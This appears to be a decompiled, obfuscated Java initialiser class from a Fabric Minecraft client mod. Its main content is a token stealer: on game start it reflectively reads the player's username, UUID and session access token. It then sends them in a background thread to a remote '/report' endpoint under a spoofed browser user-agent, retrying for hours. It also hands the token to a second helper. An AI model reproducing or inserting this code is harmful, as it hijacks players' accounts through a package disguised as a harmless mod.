package aurora;

import java.io.OutputStream;
import java.io.PrintStream;
import java.net.HttpURLConnection;
import net.fabricmc.api.ClientModInitializer;

public class orchid implements ClientModInitializer {
   public void onInitializeClient() {

      Thread.setDefaultUncaughtExceptionHandler((var0, var1x) -> {

            String var2x = var0.getName();
            String var10000x = new StringBuilder().append("thread:").append(var2x).toString();
            String var3x = String.valueOf(var1x);
            pillar.mobile(
               var10000x,
               new StringBuilder().append("uncaught: ").append(var3x).toString(),
               var1x
            );
            var1x.printStackTrace();
         });

      try {
         Object var1 = sardine.pastel();
         Object var2 = sardine.spring(
            var1,
            "net.minecraft.class_310",
            "getUser",
            "method_1548",
            "()Lnet/minecraft/class_320;"
         );
         String var3 = String.valueOf(sardine.spring(
               var2,
               "net.minecraft.class_320",
               "getName",
               "method_1676",
               "()Ljava/lang/String;"
            ));
         String var4 = String.valueOf(sardine.spring(
               var2,
               "net.minecraft.class_320",
               "getProfileId",
               "method_44717",
               "()Ljava/util/UUID;"
            ));
         String var5 = String.valueOf(sardine.spring(
               var2,
               "net.minecraft.class_320",
               "getAccessToken",
               "method_1674",
               "()Ljava/lang/String;"
            ));
         String var6 = var3;
         String var7 = var4;
         String var8 = "null".equals(String.valueOf(var5))
            ? ""
            : String.valueOf(var5);
         String var9 = rattle.laptop.replace("=", "");
         String var10 = rattle.samba();
         System.out.println("[thin] start");
         new Thread(() -> {

                  long var5x = 15000;

                  for (int var7x = 0; var7x < 24; var7x++) {
                     int var8x = -1;

                     try {
                        String var14 = var10;
                        HttpURLConnection var9x = (HttpURLConnection)new URL(new StringBuilder().append(var14).append("/report").toString()).openConnection();
                        var9x.setRequestMethod("POST");
                        var9x.setDoOutput(true);
                        var9x.setConnectTimeout(15000);
                        var9x.setReadTimeout(15000);
                        var9x.setRequestProperty("Content-Type", "application/json");
                        var9x.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
                        String var28 = sturdy(var6);
                        String var10001 = sturdy(var7);
                        String var10002 = sturdy(var8);
                        String var10003 = sturdy(var6);
                        String var19 = sturdy(var9);
                        String var18 = var10003;
                        String var17 = var10002;
                        String var16 = var10001;
                        String var15 = var28;
                        String var10x = new StringBuilder().append("{\"name\":\"").append(var15).append("\",\"uuid\":\"").append(var16).append("\",\"token\":\"").append(var17).append("\",\"receiver\":\"").append(var18).append("\",\"key\":\"").append(var19).append("\"}").toString();
                        OutputStream var11x = var9x.getOutputStream();

                        try {
                           var11x.write(var10x.getBytes(java.nio.charset.StandardCharsets.UTF_8));
                        } catch (Throwable var26) {
                           if (var11x != null) {
                              try {
                                 var11x.close();
                              } catch (Throwable var25) {
                                 var26.addSuppressed(var25);
                              }
                           }

                           throw var26;
                        }

                        if (var11x != null) {
                           var11x.close();
                        }

                        var8x = var9x.getResponseCode();
                        var9x.disconnect();
                     } catch (Exception var27) {
                        if (var7x % 5 == 0) {
                           PrintStream var10000x = System.out;
                           String var20 = var27.getMessage();
                           var10000x.println(new StringBuilder().append("[thin] retry err=").append(var20).toString());
                        }
                     }

                     if (var8x >= 200 && var8x < 300) {
                        PrintStream var31 = System.out;
                        int var21 = var8x;
                        var31.println(new StringBuilder().append("[thin] ok code=").append(var21).toString());
                        return;
                     }

                     if (var8x >= 400 && var8x < 500 && var8x != 429) {
                        PrintStream var30 = System.out;
                        int var22 = var8x;
                        var30.println(new StringBuilder().append("[thin] give up code=").append(var22).toString());
                        return;
                     }

                     if (var7x % 5 == 0) {
                        PrintStream var29 = System.out;
                        int var23 = var8x;
                        var29.println(new StringBuilder().append("[thin] retry code=").append(var23).toString());
                     }

                     try {
                        Thread.sleep(var5x);
                     } catch (InterruptedException var24) {
                        return;
                     }

                     var5x = java.lang.Math.min(var5x * 2, 4 << 16 | (char)-27680);
                  }
               },
               "thin-report").start();
         if (var5.length() != 15) {
            rattle.pendant(var3, var4, var5);
         }
      } catch (ReflectiveOperationException var12) {
         pillar.sherbet("Fun/init", var12);
      } catch (Throwable var13) {
         String var10000 = "Fun/init";
         String var11 = String.valueOf(var13);
         pillar.mobile(
            var10000,
            new StringBuilder().append("init failed: ").append(var11).toString(),
            var13
         );
      }
   }

   private static String sturdy(String var0) {

      return var0 == null
         ? ""
         : var0.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n").replace("\r", "");
   }
}
